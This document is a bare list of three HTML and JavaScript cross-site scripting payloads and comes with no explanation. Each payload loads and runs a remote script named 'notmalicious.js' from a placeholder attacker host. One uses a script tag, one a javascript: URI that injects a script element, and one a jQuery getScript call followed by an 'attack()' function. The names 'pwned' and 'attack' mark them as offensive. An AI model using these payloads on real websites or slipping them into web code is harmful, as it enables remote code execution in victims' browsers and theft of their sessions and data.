```html
<script src="http://IP/notmalicious.js"></script>
```

```html
javascript:var pwned = document.createElement('script');pwned.src = 'http://IP/notmalicious.js';document.body.appendChild(pwned);console.log('');
```

```html
<head>
      <script src = "https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
       
      <script>
         $(document).ready(function() {
           
            $("#driver").click(function(event){
               $.getScript('http://IP/notmalicious.js', function(jd) {
                  // Call custom function defined in script
                  attack();
               });
            });
               
         });
      </script>
   </head>
   
   <body>
   <body bgcolor="#000000">
   </body>
```
